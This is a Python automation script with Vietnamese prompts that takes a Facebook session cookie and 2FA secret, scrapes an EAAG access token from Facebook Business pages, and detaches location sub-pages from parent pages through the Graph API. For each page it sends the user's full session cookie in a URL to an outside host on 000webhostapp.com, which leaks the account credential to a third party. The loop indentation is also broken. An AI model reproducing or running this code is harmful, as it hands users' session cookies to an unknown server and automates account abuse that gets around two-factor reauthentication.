import requests,sys,time,os,random,re
from time import sleep
from datetime import datetime
from pystyle import Write,Colors
from pystyle import *
#==Màu==#
do = "\033[1;91m"
xanhbien = "\033[1;36m"
vang = "\033[0;33m"
hong = "\033[1;35m"
xanhduong = "\033[1;20m"
xanhla = "\033[1;32m"
xanh="\033[1;32m"
cam="\033[1;33m"
blue="\033[1;20m"
lam="\033[1;20m"
tim="\033[1;20m"
syan="\033[1;36m"
xnhac= "\033[1;96m"
den="\033[1;90m"
luc="\033[1;92m"
xduong="\033[1;94m"
trang="\033[1;97m"
den = "\033[1;90m"
luc = "\033[1;32m"
trang = "\033[1;37m"
red = "\033[1;31m"
do = "\033[1;31m"
vang = "\033[1;33m"
tim = "\033[1;35m"
lamd = "\033[1;20m"
lam = "\033[1;36m"
tim = "\033[35m"
hong = "\033[1;95m"

def jsoncookie(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})
        return result
    except(Exception,):
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})
        return result
def EAAG(cookie, fa):
	head = {
	"Host":"business.facebook.com",
	"upgrade-insecure-requests":"1",
	"user-agent":"Mozilla/5.0 (Linux; Android 12; SM-bA217F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36",
	"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"dnt":"1",
	"x-requested-with":"mark.via.gp",
	"sec-fetch-site":"none",
	"sec-fetch-mode":"navigate",
	"sec-fetch-user":"?1",
	"sec-fetch-dest":"document",
	"accept-encoding":"gzip, deflate",
	"accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
	
	}
	access = requests.get("https://business.facebook.com/content_management", headers=head,cookies=jsoncookie(cookie)).text
	try:
		token = "EAAG"+access.split('EAAG')[1].split('"')[0]
		return token
	except:
		id = cookie.split("c_user=")[1].split(";")[0]
		fa = fa.replace(" ", "")
		code = requests.get("http://2fa.live/tok/"+fa).json()["token"]
		hs = access.split('"haste_session":"')[1].split('"')[0]
		rev = access.split('"server_revision":')[1].split('"')[0]
		hsi = access.split('"hsi":"')[1].split('"')[0]
		fb_dtsg = access.split('["DTSGInitialData",[],{"token":"')[1].split('"')[0]
		lsd = access.split('"LSD",[],{"token":"')[1].split('"')[0]
		r = access.split('"__spin_r":')[1].split(',')[0]
		t = access.split('"__spin_t":')[1].split(',')[0]
		data ={
		"approvals_code":code,
		"save_device":"false",
		"__user":id,
		"__a":"1",
		"__dyn":"7xeUmF3EfXpUS2q3mbwyyVuC2-m2q3Kq2i5U4e1Fx-ewSxu68uxa2e1Ezobo9E98dEO0G8G6Ehw9-15wfO1YCwjHwuk9wgovyolwuEsxe687C2m3K2y1nUS0jG12KdwnU5W0IU9kbxR12ewi85W1bxq1uG3G48comy84CfxW4U28wdq1iwmEiwuU5Wu0FUkyFo158ixe9zUdEGdwzwea0Lo4K2e1Fwba9w",
		"__csr":"",
		"__req":"8",
		"__hs":hs,
		"dpr":"2",
		"__ccg":"EXCELLENT",
		"__rev":rev,
		"__s":"3z6ci8%3Ar5okmm%3As2km74",
		"__hsi":hsi,
		"__comet_req":"0",
		"fb_dtsg":fb_dtsg,
		"jazoest":"25716",
		"lsd":lsd,
		"__aaid":"5294291090639440",
		"__spin_r":r,
		"__spin_b":"trunk",
		"__spin_t":t,
		"__jssesw":"1"
		}
		head = {
		"Host":"business.facebook.com",
		"x-fb-lsd":lsd,
		"user-agent":"Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36",
		"content-type":"application/x-www-form-urlencoded",
		"accept":"*/*",
		"origin":"https://business.facebook.com",
		"x-requested-with":"mark.via.gp",
		"sec-fetch-site":"same-origin",
		"sec-fetch-mode":"cors",
		"sec-fetch-dest":"empty",
		"referer":"https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fcontent_management&type=avoid_bypass&app_id=0&save_device=0",
		"accept-encoding":"gzip, deflate",
		"accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		
		}
		access = requests.post("https://business.facebook.com/security/twofactor/reauth/enter/", headers=head,data=data,cookies=jsoncookie(cookie)).text
		access = requests.get("https://business.facebook.com/content_management", headers=head,cookies=jsoncookie(cookie)).text
		try:
			token = "EAAG"+access.split('EAAG')[1].split('"')[0]
			return token
		except:
			return "'die'"

listanh = ["https://i.pinimg.com/564x/a2/18/35/a2183520bc19f5a2df78a4f66afb5a2d.jpg",
]

def idelay(o):
        while(o>0):
            o=o-1
            print(f'{trang}[{do}FRIVE{trang}][{xanhbien}XX......{trang}][{vang}{o}{trang}]','     ',end='\r');sleep(1/6)
            print(f'{trang}[{do}FRIVE{trang}][{xanhbien}XXX.....{trang}][{vang}{o}{trang}]','     ',end='\r');sleep(1/6)
            print(f'{trang}[{do}FRIVE{trang}][{xanhbien}XXXX....{trang}][{vang}{o}{trang}]','     ',end='\r');sleep(1/6)
            print(f'{trang}[{do}FRIVE{trang}][{xanhbien}XXXXX...{trang}][{vang}{o}{trang}]','     ',end='\r');sleep(1/6)
            print(f'{trang}[{do}FRIVE{trang}][{xanhbien}XXXXXX..{trang}][{vang}{o}{trang}]','     ',end='\r');sleep(1/6)
            print(f'{trang}[{do}FRIVE{trang}][{xanhbien}XXXXXXX.{trang}][{vang}{o}{trang}]','     ',end='\r');sleep(1/6)
            print(f'{trang}[{do}FRIVE{trang}][{xanhbien}XXXXXXXX{trang}][{vang}{o}{trang}]','     ',end='\r');sleep(1/6)

ckk=input(f'{luc}NHẬP COOKIE FACEBOOK{trang}: ')
hai_fa=input(f'{luc}NHẬP 2FA(NẾU CÓ){trang}: ')
	
os.system("cls" if os.name == "nt" else "clear")
cookie=ckk
fa=hai_fa
Access = EAAG(cookie, fa)
if "'die'" in Access:
    print("die")
else:
    token = Access
    print('token live'.upper())
listidpage = []
a = 0
while True:
	a += 1
	idp = input(f"{luc}NHẬP ID PAGE MẸ THỨ "+str(a)+trang+": ")
	if idp == "":
		break
	listidpage.append(idp)
delay=int(input(f'{luc}NHẬP DELAY{trang}: '.upper()))
dem=0
head = {
"cookie":ckk
}
os.system("cls" if os.name == "nt" else "clear")
for k in listidpage:
	id_page=k
	print('Đang Chạy Id Page: ' +id_page)
	get_id=requests.get('https://graph.facebook.com/v3.1/'+id_page+'?fields=access_token,name&access_token='+token,headers=head).json()
	token_me=get_id["access_token"]
	ten=get_id["name"]
	get_con=requests.get('https://graph.facebook.com/v12.0/'+str(id_page)+'/locations?fields=id,name&limit=9999999&access_token='+token_me,headers=head).json()
	for x in get_con["data"]:
	       id_con=x["id"]
name_con=x["name"]
data = {
'_reqName': 'object:page/locations',
'_reqSrc': 'LocationManagerUtils',
'locale': 'vi_VN',
 'location_page_id': id_con,
'method': 'delete',
'pretty': '0',
'suppress_http_code': '1',
'xref': 'f35efb2e2143c24',
}
tach=requests.post(f"https://graph.facebook.com/v12.0/'+id_page+'/locations?access_token={token_me}",data=data,headers=head).text
if "success" in tach:
	dem+=1
	gio = datetime.now().strftime("%H:%M:%S")
	print(f"{xanhbien}CHUYỂN THÀNH CÔNG ID: {vang}{id_con}", end="\r")
	anh=random.choice(listanh)
	print(f"ĐANG ÚP AVT PAGE {id_con}", end="\r")
	upa=requests.get(f"https://vannhi9505.000webhostapp.com/UPAVTFANPAGE.php?link={anh}&id={id_con}&cookie={ckk}")

	print(f'{trang}[{vang}{dem}{trang}] | {vang}{gio}{trang} | {xanhbien}SUCCESS | {luc}UID:  {vang}{id_con} {trang}| {luc}NAME : {vang}{name_con}{trang}')	   
	idelay(delay)
else:
	print(f"{do}CHUYỂN KHÔNG THÀNH CÔNG !!")
	gio = datetime.now().strftime("%H:%M:%S")
	dem+=1
	print(f"{trang}[{vang}{dem}{trang}] | {vang}{gio}{trang} | {do}ERROR{trang} | {luc}UID:  {vang}{id_con}{trang} | {luc}NAME : {vang}{name_con}{trang}")
	idelay(delay)
